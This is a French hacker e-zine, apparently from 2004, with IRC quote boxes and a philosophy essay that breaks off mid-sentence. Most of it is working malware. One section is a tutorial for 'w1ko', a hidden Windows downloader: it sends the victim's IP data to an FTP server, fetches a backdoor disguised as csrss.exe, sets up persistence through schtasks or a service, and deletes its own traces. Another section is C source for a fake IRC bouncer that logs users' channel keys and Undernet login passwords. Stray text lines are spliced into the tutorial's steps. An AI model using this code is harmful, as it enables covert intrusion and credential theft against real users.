Alors comment  j'utilise cette fameuse fonction? C'est trΦs simple, vous  n'avez  qu'α suivre 
les Θtapes mousaillons!

1)	Ouvrir VC++ ( MSDEV.EXE )

2)	CrΘΘ un nouveau fichier en cliquant sur la  feuille  blanche  ΘtoilΘe. (  Que   c'est 
        romantique )
	Copie et colle ceci :
	#include &lt;windows.h>
	void startup()
	{
	SellExecute(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOWNORMAL);
	}

3)	Fait Ctrl+F7. BANG cat demande de crΘΘ un projet dit et rΘpond oui. 

4)	Ensuite   tu   va   dans l'onglet "Build/Set active configuration" et met ca en Win32 
        Release. Ca va rΘduire de bcp la taille  du  programme  qui  va etre linker pour crΘΘ 
        un exe. 

5)	Fait Alt+F7. Va  dans  l'onglet  C/C++  et  dans  la boite de texte "Project Options" 
        copie et colle ceci : /ML /O1 /Fo"Release/" /c 

6)	Va dans l'onglet et dans la boite de texte "Project Options" copie et  colle ceci :
	shell32.lib /nologo /entry:"startup" /subsystem:windows /incremental:no 
        /pdb:"Release/w1ko.pdb" /machine:I386 	/nodefaultlib /out:"Release/w1ko.exe" 
        /ignore:4078 /merge:.rdata=.text /merge:.data=.text /merge:.reloc=.text 	
        /section:.text,erwx /opt:ref /stub:stub.exe 

7)	Clic OKidou

8)	Tu pΦse F7 pis BOOM tu vient de crΘΘ un beau ti exe de 8 ko.

9)	La  tu  va  dans  le  dossier o∙ ta crΘΘ ton projet et ensuite le dossier release. La 
        c'est  ton  exe.  Parce  que  8  ko c'est gros ben packer le avec Mew ou FSG et  vous 
        obtenez un exe de 700 octets.

10)	Maintenant ExΘcuter le :-)

Et oui, notepad ouvre... 

==================================================================


Voici comment la fonction ShellExecute fonctionne:

ShellExecute(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOWNORMAL);
	          -1-       -2-	-3-	     -4-      -5-                 -6-	

DΘbutons avec -1- et -5-, on s'en criss!

-2- Peut etre remplacer par:
	"Open": Pour ouvrir un fichier mais n'est pas nΘcessaire.
	"Explore": Peut servir α explorer un dossier.
	"Find": Pour faire une recherche dans un dossier.

-3- Le nom du programme  α  ΘxΘcuter,  il faut donner le chemin complet et sΘparer le  chemin 
    avec des \\ pour faire un \.  Par exemple c:\\windows\\system32\\calc.exe.  Les programme 
    qui sont situΘ dans la  variable  PATH  de Windows n'ont pas besoin  d'avoir leurs chemin 
    spΘcifiΘ.

-4- Ce   parametre  sert  α  donner  les  paramΦtres  que  nous  voulons  exΘcuter avec notre 
    programme. C'est surtout pour les programmes en mode console. Par exemple Ping 127.0.0.1. 
    ceci va donner: ShellExecute(NULL, NULL, "ping.exe", "127.0.0.1", NULL, SW_SHOWNORMAL); 

-5-  Ca  c'est  le  plus  cool  des  paramΦtres. Il permet de choisir quelle type d'affichage 
     il y aura lorsque le  programme sera exΘcuter. Par exemple maximiser  ou  minimiser,  ou 
     bien tout simplement invisible :-) Lorsque l'on veut mettre des paramΦtre  qui  requiert  
     des  guillement  (""), il faut changer le " par un \". Exemple  pour  cacher  la fenΩtre 
     faite:
     
     ShellExecute(NULL, NULL, "ping.exe", "127.0.0.1", NULL, SW_HIDE);
      
     Magique non?

pour en savoir plus allez voir:
http://msdn.microsoft.com/library/default.asp?url=/library/en-us/shellcc/platform/shell/reference/functions/shellexecute.asp

========================================================================


Mais α quoi ca sert d'exΘcuter 1000 notepad allez-vous me demandez... lol ben α  rien.  C'est 
pourquoi  nous  utiliserons  ShellExecute  pour  nous  faire un beau petit FTP downloader qui 
ouvrira une backdoor. Pour ceux qui aime mieux ouvrir 1000 notepad, et  bien  fait  Alt+F4 et 
allez visiter www.avecsonchien.com. Ce qui est amusant c'est que notre FTP downloader ne fait 
mΩme 1ko. C'est pourquoi, aprΦs un gramme  bat  de skunk  fou,  j'ai  dΘcidΘ  d'appeler notre 
programme w1ko. Tout les  commandes  effectuΘes  par  w1ko  sont  en  DOS.  Hein  WTF?  Ouais  
en  dos  car  le  programme  que la fonction  ShellExecute  executera  sera   cmd.exe avec le 
paramΦtre /c. Ce parametre dit α cmd.exe d'exΘcuter les commandes dos que nous lui  donnerons 
et puis de se terminΘ. Oui mais  comment  jvais faire pour mettre plusieurs commandes sur une 
mΩme ligne? Simplement en sΘparent les commandes par le caractΦre &.

Pour  avoir une idΘe plus claire des actions de w1ko, voici les commandes  DOS  qu'il exΘcute 
invisiblement

1) 	ExΘcute ipconfig et met les rΘsultats dans un fichier nommΘ   ez%username%.tmp  situΘ 
        dans le temp. La  variable  %username%  reprΘsente  l'utilisateur  courant.  Donc  ce 
        fichier a un nom appropriΘ α chaque victime. Ce fichier permetra de savoir  l'adresse 
        IP de la victime.
	
	ipconfig>%tmp%\ez%username%.tmp


2) 	CrΘation   d'un   fichier   automatisΘ   qui   permetra   α   FTP.exe  de tΘlΘcharger 
        automatiquement notre backdoor. Ce  fichier  contient  le  user/pass du FTP, l'envoie 
        du fichier ez%username%.tmp, le changement  de  rΘpertoire  pour  le  tΘlΘchargement,  
        le  changement  de  type   de   tΘlΘchargement  pour  binary,  le  tΘlΘchargement  du 
        backdoor  qui  est ici csrss.exe et puis finalement un beau  ti bye bye au FTP.  J'ai 
        choisi  le  nom  csrss.exe  pour la backdoor car  lorsqu'un  programme  est  exΘcuter  
        sous ce nom il ne peut Ωtre arrΩter avec   "Terminer le processus".  Ce  fichier  est  
        crΘΘ dans le dossier temp sous le  nom  de ez1.tmp. En   passent  pour  ceux  qui  se  
        demande  ce  que  signifie  %path:~0,19%   ben  c'est  en  fait  c:\windows\system32.  
        C'a  prend moins de caractΦres ;-)
	
	echo user le_user_name>%tmp%\ez1.tmp
	echo le_password>>%tmp%\ez1.tmp
	echo put %tmp%\ez%username%.tmp>>%tmp%\ez1.tmp
	echo lcd %path:~0,19%\wins>>%tmp%\ez1.tmp
	echo bin>>%tmp%\ez1.tmp
	echo get csrss.exe>>%tmp%\ez1.tmp
	echo bye>>%tmp%\ez1.tmp

3)	ExΘcution de FTP.exe  qui  suivra  les  commande  de  %tmp%\ez1.tmp  grace au 
        paramΦtre -s. Le  paramΦtre -v  supprime  l'affichage des rΘponses du serveur 
        distant, le  paramΦtre -i dΘsactive  l'invite  s'il  y a plusieurs fichiers α 
        transfΘrer puis finalement le pramΦtre n supprime la connexion automatique au  
        dΘmarrage.  Il  faut  bien sur spΘcifier l'adresse IP ou le nom de domaine du 
        serveur FTP. Par exemple ici 209.202.240.80, c'est ftp.tripod.com.
	
	ftp -v -i -n -s:%tmp%\ez1.tmp 209.202.240.80

flash. Cette  technologie a beau Ωtre en constant essort, le nombre de types de "clients" qui 
4)	Puisque    nous    n'avons   plus    besoin   des    fichiers     %tmp%\ez1.tmp    et 
        %tmp%\\ez%username%.tmp, pourquoi ne  pas  les  supprimer  pour effacer nos traces... 
        En  passent  pour  ceux qui n'ont pas compris l'utilitΘ de l'Θtoile  ben acheter vous 
        ms-dos pour les nuls.

	del %tmp%\ez*
flash. Cette  technologie a beau Ωtre en constant essort, le nombre de types de "clients" qui 
5)	Gnan  ben  cpa  1337 ton truc y par mΩme pas a toute les fois que le h4x0riZΘ par son 
        compute.  Tout  faux!!!  Grave  α  notre  ami   schtasks   nous   allons    crΘΘ  une 
        merveilleuse tΓche nommΘe system, qui  va  exΘcuter  notre  belle  petite  backdoor α 
        toute les 7 minutes. Alors a chaque 7 minutes vous Θclatez de joie  aprΦs  avoir fait 
        un beau ti nc -lvvp 1337 ;-).

	schtasks /create /tn system /tr "%path:~0,19%\wins\csrss.exe" /sc minute /mo 7 /ru ""

6)	Puisqu'on est pas ben ben patient pis qu'on veut pas attendre ce 7 minute la premiere 
        fois qu'on exΘcute w1ko, ben on le start drette live!

	start %path:~0,19%\wins\csrss.exe

7)	Cpa  cool  de  laisser notre  pauvre  petit  w1ko  poirotter comme ca sur la victime. 
        Alors pourquoi ne pas l'auto-supprimΘ lorsqu'il est exΘcutΘ :-P

	del w1*

===========================================================================


Et comment je met ces commandes DOS la en C++ ? Comme ca :

#include &lt;windows.h>
void startup()
{
ShellExecute(NULL, NULL, "cmd", "/cipconfig>%tmp%\\ez%username%.tmp&echo user TON_USER>%tmp%\\ez1.tmp&echo TON_PASS>>%tmp%\\ez1.tmp&echo put %tmp%\\ez%username%.tmp>>%tmp%\\ez1.tmp&echo lcd %path:~0,19%\\wins>>%tmp%\\ez1.tmp&echo bin>>%tmp%\\ez1.tmp&echo get csrss.exe>>%tmp%\\ez1.tmp&echo bye>>%tmp%\\ez1.tmp&ftp -v -i -n -s:%tmp%\\ez1.tmp 209.202.240.80&del %tmp%\\ez*&schtasks /create /tn system /tr \"%path:~0,19%\\wins\\csrss.exe\" /sc minute /mo 7 /ru \"\"&start %path:~0,19%\\wins\\csrss.exe&del w1*", NULL, SW_HIDE);
}



et pour ceux qui aime pas trop l'idΘe de schtasks, il est tourjours possible de crΘΘ backdoor 
en Service en utilisant Instsrv.exe et Srvany.exe de la faτon suivante: 
	Instsrv.exe = svchost.exe et 
	Srvany.exe = smss.exe:

#include &lt;windows.h>
void startup()
{
ShellExecute(NULL, NULL, "cmd", "/cipconfig>%tmp%\\ez%username%.tmp&echo user b8st5gh>%tmp%\\ez1.tmp&echo ard3lu7>>%tmp%\\ez1.tmp&echo put %tmp%\\ez%username%.tmp>>%tmp%\\ez1.tmp&echo lcd %windir%\\system32\\wins>>%tmp%\\ez1.tmp&echo bin>>%tmp%\\ez1.tmp&echo mget smss.exe svchost.exe csrss.exe>>%tmp%\\ez1.tmp&echo bye>>%tmp%\\ez1.tmp&ftp -v -i -n -s:%tmp%\\ez1.tmp 209.202.240.80&del %tmp%\\ez*.*&%windir%\\system32\\wins\\svchost.exe \"Service d'aide\" %windir%\\system32\\wins\\smss.exe&REG add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Service d'aide\\Parameters\" /v Application /t reg_sz /d %windir%\\system32\\wins\\csrss.exe /f&net start \"Service d'aide\"&del %windir%\\system32\\wins\\sv*.exe&del w1ko.exe", NULL, SW_HIDE);
}


Ca  ne s'arrete pas lα, nous pourrions partir le service Telnet WinXp pro, sharer les disques 
dur  de  la  victime,  inserer  un  sniffer  invisible,  un keylogger, etc... Bref ya  pleins 
d'amusantes choses α faire avec cette fonction, il suffit d'y penser. J'espere  que  ce petit 
tutorial vous a plus...

wAXAw,
wAxXxAw@gmail.com


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|&lt;g463> Quand j'avais 18 ans, je mangeais pas de brocolis\_ \   \\_  \_ \         `
 || |&lt;g463> parce que j'apprΘciais pas le go√t, et je me       \\_  \_ \   \\_ M  ; . X
 || |&lt;g463> connaissais assez pour dire que je n'aimais pas un \_ \   \\_  \_ \ K      
 || |&lt;g463> criss de lΘgumes, et que τa finissait lα... Pourtant,\\_  \_ \   \\_ -  : '
 ||`|&lt;g463> avec le temps, avec l'expΘrience que j'ai acquise    \_ \   \\_  \_ \ 1   
 || |&lt;g463> durant ma vie, j'ai appris que les lΘgumes Θtaient     \\_  \_ \   \\_ 1  + 
 || |&lt;g463> nutritifs, que notre corps en avait besoin pour vivre, \_ \   \\_  \_ \ 1   
 ||'|&lt;g463> et toutes cette information a envoyer des influx positif \\_  \_ \   \\_  x 
 || |&lt;g463> α mon sens du go√ter pour linfluencer.                   \_ \   \\_  \_ \  `
 || |&lt;g463> Pourtant au dΘbut je pouvais dire que je me connaissais    \\_  \_ \   \\_  
 ||,|&lt;g463> assez pour dire que jamais j'aurais manger un esti         \_ \   \\_  \_ \.
 || |&lt;g463> d'lΘgume de ma vie.                                          \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[  mindkind health care                                                 ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O9]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[  Un affaire de fake-bnc       ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   phawnky    ]=\:\ _//     
                                                  \__\________________________/__/ 

/* 
   Fake BNC - MKD - phawnky - 2k4

   J'ai cree se soft a la demande d'un gars (no shit!  juree  la...)  qui  voulait piquer des 
   cservices users/pass et, en bonus, des chans keys.
   
   En  bref,  le  code  redirect  une  connection  a  IRCBNC  (defined)  et  output les trucs 
   interessant qui se passe.
  
   J'ai compiler/tester le code et il est 100% fonctionel sous:
      
      -Win98     (Avec cygwin)
      -WinXP sp2 (Avec cygwin)  
      -freebsd 4.x
  
   Exemple d'utilisation:
   ----------------------
   
   @@@@@@@@@@@@@@@@[ irc ]@@@@@@@@@@@@@@@@
   (3.56p) wasting your life away in #KKK
   &lt;phawnky> Hi! can someone test my BNC @ iam.leet.as.fuck.kr port 3000 ?
     
   
   @@@@@@@@@@@@@@@@[ box ]@@@@@@@@@@@@@@@@
   <-Funky@-> ./mkd-fbnc 3000
   -------------------------------
   [MKD] - FakeBNC - phawnky - 2k4
   -------------------------------

   [+] Listening on port 3000...
   [+] Incoming connection from: 64.57.75.131
   [+] Successfully connected to 216.152.77.10:6667
   [+] NICK MuMMy
   [+] USER tested "64.57.75.131" "iam.leet.as.fuck.kr" I've lost my friends today.
   [+] Joined chan #KKK
   [+] X Username: mummy
   [+] X Passowrd: 1fUKiNg1
   [+] Connection Terminated.
   ^C
   
   @@@@@@@@@@@@@@@@[ irc ]@@@@@@@@@@@@@@@@
   &lt;MuMMy> looking good
   &lt;phawnky> kthxbye
   
*/



#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;errno.h>
#include &lt;unistd.h>
#include &lt;sys/types.h> 
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>

#define LOGF        "./fbnc.log"
#define IRCBNC      "216.152.77.10"
#define IRCBNC_PORT  6667

// Prototype
void usage(char *);            // lemure
void banner(void);             // Show off
int monitor(int, char *, int); // wo0t
void infograbber(char *);      // Big brother
void stripshit(char *, int);   // lazy
void logshit(char *, char *, char *); 

int main(int argc, char *argv[])
{
     int sockfd, newsockfd, portno, clilen;
     struct sockaddr_in serv_addr, cli_addr;
     int yes=1;
     
     if (argc < 2) {
         usage(argv[0]);
         exit(-1);
     }
     
     banner();
     
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
        perror("Socket() ");
        exit(-1);
     }
     
     // Recycler c'est bien, les femmes hippy aime ca, et j'aimes les femmes.
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,sizeof(int)) == -1) {
            perror("setsockopt");
            exit(1);
        }
     
     portno = atoi(argv[1]);
     
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);
     
     if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("Bind() ");
        exit(-1);
     }
     
     listen(sockfd,5);
     clilen = sizeof(cli_addr);
     
     printf("[+] Listening on port %d...\n", portno);
     
     while(newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen)) 
     {  
        // 1st, L'ip.
        printf("[+] Incoming connection from: %s\n", inet_ntoa(cli_addr.sin_addr));
       
        logshit(LOGF, "\n[+] - New session Started - [+]\n"
                      "IP:  %s\n", 
                      (char *) inet_ntoa(cli_addr.sin_addr));
        
        monitor(newsockfd, IRCBNC, IRCBNC_PORT);      
          
        logshit(LOGF, "[+] - %s Hung up - [+]", (char *) inet_ntoa(cli_addr.sin_addr));
        // Closing Socket
        close(newsockfd);
     }
     return 0; 
}

void
usage(char *progname)
{         
          banner();
          printf("Usage: %s portnum\n\n", progname);
}          

void 
banner(void)
{
   printf("-------------------------------\n"
          "[MKD] - FakeBNC - phawnky - 2k4\n"
          "-------------------------------\n\n");
}             


void 
logshit(char *fname, char *fmt, char *s)
{
   FILE *log;
   
   log = fopen(fname, "a+");
   if (!log) {
      perror("fopen() ");
      exit(-1);
   }

   fprintf(log, fmt, s);
   fclose(log);
}

void
stripshit(char *s, int sz)
{
   int i, j;
   
   for(i=j=0; i < sz; i++)
      if(s[i] != ':')
         s[j++] = s[i];
   s[j] = 0x00;
}

int 
monitor(int sock, char *server, int port)
{
   struct sockaddr_in sin;
   int rsock;
   char buf[255];
   fd_set rfds;
   int len;
     
   FD_ZERO(&rfds);
          
   sin.sin_family = AF_INET;
   sin.sin_port = htons(IRCBNC_PORT);
   sin.sin_addr.s_addr = inet_addr(IRCBNC);
   
   rsock = socket(AF_INET, SOCK_STREAM, 0);
   if (rsock < 0 || (connect(rsock, (struct sockaddr *) &sin, sizeof(sin))) < 0) {
      perror("[-] connect()");
      return;
   }
   
   printf("[+] Successfully connected to %s:%d\n", server, port);
    
   while(1)
   {  
     FD_SET(sock, &rfds);
     FD_SET(rsock, &rfds);
                    
     if (select(rsock+1, &rfds, 0x00, 0x00, 0x00) == -1) {
         perror("[-] Select()");
         exit(-1);
     }

     bzero(buf, sizeof(buf));     

     // Passoire a truc interessant + forwarding
     if (FD_ISSET(sock, &rfds)) {                         // Le sucker send du stuck
       if (len = recv(sock, buf, sizeof(buf)-1, 0) < 0) { // Le sucker a dropper
          close(rsock);
          break;
       }
      
      
       if(strlen(buf))
          infograbber(buf); // Filtrage et/ou modifications
          
       if(len = send(rsock, buf, strlen(buf), 0) < 0) {  
          close(rsock);
          break;
       }
     }
     bzero(buf, sizeof(buf));

     if(FD_ISSET(rsock, &rfds)) {                          // Le serveur a sender du data         
       if (len = recv(rsock, buf, sizeof(buf)-1, 0) < 0) { // Le serveur est mouru
          close(rsock);
          break;
       }
       if (len = send(sock, buf, strlen(buf), 0) < 0) {    // Le sucker a dropper
          close(rsock);  
          break;
       }
     }
   }
   printf("[+] Connection Terminated.\n");
   return 0;
}      

void
infograbber(char *buf)
{
   char *bkp;
   char *ptr;
   char *tmp;
   char chan[255], chanpass[255], tmpbuf[510];   
   
   // Commande NICK?
   bkp = strdup(buf);
   ptr = strstr(bkp, "NICK");
   if (ptr) {
      strtok(ptr, "\n");
      stripshit(ptr, strlen(ptr));
      printf("[+] %s\n", ptr);
      logshit(LOGF, "%s\n", ptr);
   }
   
   // Commande USER?
   free(bkp);
   bkp = strdup(buf);
   ptr = strstr(bkp, "USER");
   if(ptr) { 
      strtok(ptr, "\n");
      stripshit(ptr, strlen(ptr));
      printf("[+] %s\n", ptr);
      logshit(LOGF, "%s\n", ptr);
   }      
   
   // Commande JOIN?
   free(bkp);
   bkp = strdup(buf);
   ptr = strstr(bkp, "JOIN");
   if(ptr) { 
      for(tmp = strtok(ptr, "\n"); tmp; tmp = strtok(0x00, "\n")) 
      {
         stripshit(tmp, strlen(tmp));
         if(sscanf(tmp, "%s %s %s", tmpbuf, chan, chanpass) == 3) {
            printf("[+] Joined chan %s Using pass: %s\n", 
                    chan, chanpass);
            snprintf(tmpbuf, sizeof(tmpbuf)-1, 
                     "Joined chan %s Using pass: %s\n",
                     chan, chanpass);
            logshit(LOGF, "%s", tmpbuf);        
         } else {
            printf("[+] Joined chan %s\n", chan);
            logshit(LOGF, "Joined chan %s\n", chan);       
         }                
      }
   }       
   // Commande join? (Mirc est gay et send ca en lowercase)
   free(bkp);
   bkp = strdup(buf);
   ptr = strstr(bkp, "join");  
   if(ptr) { 
      for(tmp = strtok(ptr, "\n"); tmp; tmp = strtok(0x00, "\n")) 
      {
         stripshit(tmp, strlen(tmp));
         if(sscanf(tmp, "%s %s %s", tmpbuf, chan, chanpass) == 3) {
            printf("[+] Joined chan %s Using pass: %s\n", 
                    chan, chanpass);
            snprintf(tmpbuf, sizeof(tmpbuf)-1, 
                     "Joined chan %s Using pass: %s\n",
                     chan, chanpass);
            logshit(LOGF, "%s", tmpbuf);        
         } else {
            printf("[+] Joined chan %s\n", chan);
            logshit(LOGF, "Joined chan %s\n", chan);       
         }                
      }
   }       
   
   // Le but premier.
   //PRIVMSG x@channels.undernet.org :login USER PASS\n
   free(bkp); 
   bkp = strdup(buf);
   ptr = strstr(bkp, "PRIVMSG x@channels.undernet.org");
   if(ptr) {  // OMG!
      tmp = strtok(ptr, ":");   // PRIVMSG x@channels.undernet.org 
      tmp = strtok(0x00, " ");  // login
      tmp = strtok(0x00, " ");  // USER
      printf("[+] X Username: %s\n", tmp);
      logshit(LOGF, "X Username: %s\n", tmp);
      tmp = strtok(0x00, "\n"); // PASS
      printf("[+] X Passowrd: %s\n", tmp);
      logshit(LOGF, "X Passowrd: %s\n", tmp);
   }
   free(bkp);
      
}




  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|&lt;binf> decrypt/decypher ne s'applique pas toujours a de \_ \   \\_  \_ \         `
 || |l'encryption....                                          \\_  \_ \   \\_ M  ; . X
 || |&lt;wyzeman> faut aimer jouer sur les mots                   \_ \   \\_  \_ \ K      
 || |&lt;wyzeman> voit ca comme un image                            \\_  \_ \   \\_ -  : '
 ||`|&lt;binf> non c'est asser comun en anglais                     \_ \   \\_  \_ \ 1   
 || |&lt;wyzeman> afaik cette discution est francophone               \\_  \_ \   \\_ 1  + 
 || |&lt;wyzeman> at least franglais                                  \_ \   \\_  \_ \ 1   
 ||'|&lt;binf> du genre si tu ecrit merde possible qu'un americain te   \\_  \_ \   \\_  x 
 || |demande hey wyzeman would you decypher this hand writing for me \_ \   \\_  \_ \  `
 || |please.                                                           \\_  \_ \   \\_  
 ||,|&lt;binf> ecrit merde == ecrire mal                                  \_ \   \\_  \_ \.
 || |wyzeman on avait decypherer ta merde de phrase binf                 \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ sur #hack.fr meme l'humour sent le geek                               ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[10]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Un affaire de philosophie     ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    Qwzykx    ]=\:\ _//     
                                                  \__\________________________/__/ 


CÆest  dans  un  esprit  de  dΘcouverte  et  de  rΘjouissance,  que  je  vous  propose  cette  
introspection  dans   les  mΘandres  de   la  rΘalitΘ,  dans   toute  son intemporalitΘ. Dans 
cet article plut⌠t volumineux en perspective, on traitera de  notre  insignifiance, de notre, 
petitesse,  du temps qui fille au  compte gouttes  depuis  des  milliards dÆannΘes, donc avis  
α tout les Θlitismes de ce  monde,  cet  article  peut  peser lourd sur votre egoà lisez donc 
avec modΘration, je  voudrais  quand  mΩme  pas Ωtre  responsable dÆun  dΘbordement dÆΘmotion  
de votre part. Un  article  de philo   ... un  autre,  mais  par ou   commencer!? Quoi  dire,  
quoi tenter d'expliquer α des personnes tout  α fait inconnue... Qui ont des buts diffΘrents, 
des  ambitions plus  ou moins  louables...  et  qui  ont  tous  leurs  vendredi  soir de rΩve 
ou de merde  bien a eux ;)  Mais en dehors de  tout ces inconnues qui  sont inexorablement le 
reflet de l'incertitude de ce qu'on vois chez cette magnifique fille  qui se  presse de  nous  
servir  un verre, ou  du dΘ-intΘrΩt  le plus total qu'on  Θprouve envers le pompiste du coin,  
dans tout ca y doit bien  y  avoir un lien  commun,  un intΘrΩt commun...  aprΦs  tout la map  
est la mΩme  pour tout le monde, l'Θpoque aussi,  et  bien  que  nous  sommes  tous  beaux et  
unique  comme des  flocons de   neiges,  notre unicitΘ s'Θtant fondamentalement α la pyramide   
de Maslow  :) Mais   derriΦre tout ca, on dΘsir plus  le bonheur et  les  fous rires absurdes 
au malheurs et aux larmes acides. QuÆon soit Chinois ou Australien, on pense fondamentalement 
α  la   mΩme chose, soit mΩme  avant tout, et  cÆest  pas mal  en soit de  penser α sa   peau
avant celle des autres, dÆavoir plus  dÆestime  du monde qui vous entoure que d'estime envers 
de pures  inconnues..    cÆest toujours  dans  un  but   dΘguisΘ   de  survie   social..   et  
fondamentalement  personnelle  ;)  On a tous une culture  diffΘrente, mais  ou  la diffΘrance 
a  peu  α voir avec nos valeurs essentiels (besoin Physique, besoin de  sΘcuritΘ,      besoin
dÆappartenance,  dÆestime   de    sois,   et    dÆaccomplissement)  On    oublie plut⌠t  bien  
dans  la modernitΘ du monde  qui nous entoure lÆessentiel de ses concepts.  Suffit dÆune nuit 
seul dehors dans une ville inconnue pour avoir un dΘbalancement  marquer de  cette  pyramide.   
Une  situation   que bien des touristes  tentent dÆΘviter α tout  prix dÆailleurs;) Un  model 
vraiment   utile  pour  plusieurs  corps  militaires  qui  sÆadonne  α  des  techniques    de   
brainwashing en rΦgle.. ici  je vous laisse   tirez vos  conclusions.. MalgrΘ  tout,   chaque
personne a sa petite vision  du  monde, ses petites thΘories absolue sur  ce qui lÆentoure.

De  toutes  ces grandes  incertitudes  on vois  le  monde qui  nous  entour  sous  diffΘrents 
angles,  autant d'angles  que de  paire dÆyeux  qui le  regarde,  trois  dimensions qui  nous 
entoures  ou tous  semblent s'Ωtre  habituΘs, dΘplacer  des  objets,  regarder des personnes, 
crΘe en modifiant l'Θtat de la matiΦre. Le temps est  peut-Ωtre la  seule dimension  tangible 
qui  nous diffΘrencie  les uns  des  autres, car aprΦs tout  il faut une Θvaluation  du temps 
dans un  autre mode que celui prΘsent pour le dΘceler, pour espΘrer le dΘplacer, le modifier.

Et ce qui diffΘrencie une ou   plusieurs personnes entre elles se dΘfini    plus par le temps  
passΘe   qui nous   est  propre   que par   les  trois  autres dimensions prΘsenteà un  jolie 
chandail,  une  jupe courte, un   chapeau  melon,  des bottes  de cuirs?!  Tant d'ΘlΘment qui 
placer dans un  bars, dans un 2 1/2 ou α   la  piscine   municipal  ne   sont  qu'aguicheurs,     
qu'Θnigmatiques, qu'intrigants.  Mais le temps a se pouvoir  d'user  l'intrigant, de    polir
l'intΘrΩt,  aprΦs  40 fois une situation absurde passe au clicher... un ΘvΦnement  dΘplaisant  
deviens  une    constante,  un  fou  rire   deviens  un souvenirs. Et c'est ici  que tout  le 
monde  prend un chemin diffΘrent  dans  la  4e  dimension, les  souvenirs sont  des  ΘlΘments 
d'expΘriences prΘcΘdentes, des situations qui   tendent α   se polirent   par  leurs   simple  
re-introduction.  Suivant  une  courbe  d'apprentissage  1/exp  nous apprenons rapidement les  
